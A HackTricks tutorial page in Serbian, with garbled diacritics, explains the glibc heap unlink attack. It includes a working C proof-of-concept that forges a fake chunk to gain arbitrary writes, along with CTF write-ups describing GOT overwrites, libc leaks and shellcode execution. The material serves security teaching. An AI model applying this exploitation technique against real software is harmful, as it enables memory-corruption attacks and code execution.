# Unlink Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Osnovne informacije

Kada je ovaj napad otkriven, uglavnom je omogu캖avao WWW (Write What Where), me캠utim, neki **provere su dodate** 코to je novu verziju napada u캜inilo zanimljivijom, slo쬰nijom i **beskorisnom**.

### Primer koda:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Napad ne funkcioni코e ako se koriste tcaches (posle 2.26)

### Cilj

Ovaj napad omogu캖ava da **promenite pokaziva캜 na deo da pokazuje 3 adrese pre sebe**. Ako se ova nova lokacija (okolina gde je pokaziva캜 bio sme코ten) sadr쬴 zanimljive stvari, kao 코to su druge kontrolisane alokacije / stek..., mogu캖e je da ih pro캜itate/prepi코ete kako biste izazvali ve캖u 코tetu.

* Ako je ovaj pokaziva캜 bio sme코ten u steku, po코to sada pokazuje 3 adrese pre sebe i korisnik potencijalno mo쬰 da ga pro캜ita i izmeni, bi캖e mogu캖e da se otkriju osetljive informacije iz steka ili 캜ak da se izmeni adresa povratka (mo쬯a) bez dodirivanja kanarija.
* U skladu sa CTF primerima, ovaj pokaziva캜 se nalazi u nizu pokaziva캜a na druge alokacije, stoga, 캜ine캖i ga da pokazuje 3 adrese pre i mogu캖no코캖u da ga pro캜ita i pi코e, mogu캖e je da se drugi pokaziva캜i usmere na druge adrese.\
Po코to korisnik potencijalno mo쬰 da 캜ita/pi코e i druge alokacije, mo쬰 da otkrije informacije ili prepi코e nove adrese na proizvoljnim lokacijama (kao u GOT-u).

### Zahtevi

* Neka kontrola u memoriji (npr. stek) da se kreira nekoliko delova dodeljuju캖i vrednosti nekim od atributa.
* Stek leak kako bi se postavili pokaziva캜i la쬹og dela.

### Napad

* Postoji nekoliko delova (chunk1 i chunk2)
* Napada캜 kontroli코e sadr쬬j chunk1 i zaglavlja chunk2.
* U chunk1 napada캜 kreira strukturu la쬹og dela:
* Da bi zaobi코ao za코tite, osigurava da je polje `size` ispravno kako bi izbegao gre코ku: `corrupted size vs. prev_size while consolidating`
* i polja `fd` i `bk` la쬹og dela pokazuju gde je pokaziva캜 chunk1 sme코ten sa pomerajima od -3 i -2 respektivno, tako da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na poziciju u memoriji (stek) gde se nalazi prava adresa chunk1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Zaglavlja chunk2 su modifikovana da ozna캜e da prethodni deo nije kori코캖en i da je veli캜ina veli캜ina sadr쬬nog la쬹og dela.
* Kada se drugi deo oslobodi, tada se ovaj la쬹i deo unlink-uje de코avaju캖i:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Prethodno je napravljeno da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na isto mesto (lokaciju u steku gde je `chunk1` bio sme코ten, tako da je to bila validna povezana lista). Po코to **oba pokazuju na istu lokaciju**, samo 캖e poslednji (`fake_chunk->bk->fd = fake_chunk->fd`) imati **efekat**.
* Ovo 캖e **prepisati pokaziva캜 na chunk1 u steku na adresu (ili bajtove) sme코tene 3 adrese pre u steku**.
* Stoga, ako bi napada캜 mogao ponovo da kontroli코e sadr쬬j chunk1, mo캖i 캖e da **pi코e unutar steka** potencijalno prepisuju캖i adresu povratka presko캜iv코i kanarija i menjaju캖i vrednosti i pokaziva캜e lokalnih promenljivih. 캛ak i ponovo menjaju캖i adresu chunk1 sme코tenu u steku na drugu lokaciju gde, ako bi napada캜 ponovo mogao da kontroli코e sadr쬬j chunk1, mogao bi da pi코e bilo gde.
* Imajte na umu da je ovo bilo mogu캖e jer su **adrese sme코tene u steku**. Rizik i eksploatacija mogu zavisiti od **gde su adrese la쬹og dela sme코tene**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Reference

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Iako bi bilo 캜udno prona캖i unlink napad 캜ak i u CTF-u, ovde imate neke izve코taje gde je ovaj napad kori코캖en:
* CTF primer: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* U ovom primeru, umesto steka postoji niz malloc'ovanih adresa. Unlink napad se izvodi kako bi se mogla alocirati chunk ovde, stoga se mo쬰 kontrolisati pokaziva캜e niza malloc'ovanih adresa. Zatim, postoji jo코 jedna funkcionalnost koja omogu캖ava modifikaciju sadr쬬ja chunk-ova u ovim adresama, 코to omogu캖ava usmeravanje adresa na GOT, modifikaciju adresa funkcija za dobijanje leak-ova i RCE.
* Jo코 jedan CTF primer: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Ba코 kao u prethodnom primeru, postoji niz adresa alokacija. Mogu캖e je izvr코iti unlink napad kako bi se adresa prve alokacije usmerila nekoliko pozicija pre po캜etka niza i prepisala ovu alokaciju na novoj poziciji. Stoga, mogu캖e je prepisati pokaziva캜e drugih alokacija da pokazuju na GOT funkcije atoi, ispisati je da bi se dobio libc leak, a zatim prepisati atoi GOT sa adresom do jednog gadget-a.
* CTF primer sa prilago캠enim malloc i free funkcijama koje zloupotrebljavaju ranjivost vrlo sli캜nu unlink napadu: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Postoji overflow koji omogu캖ava kontrolu FD i BK pokaziva캜a prilago캠enog malloc-a koji 캖e biti (prilago캠eni) oslobo캠eni. 맚avi코e, heap ima exec bit, tako da je mogu캖e otkriti adresu heap-a i usmeriti funkciju iz GOT-a na heap chunk sa shellcode-om za izvr코avanje.

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove podno코enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
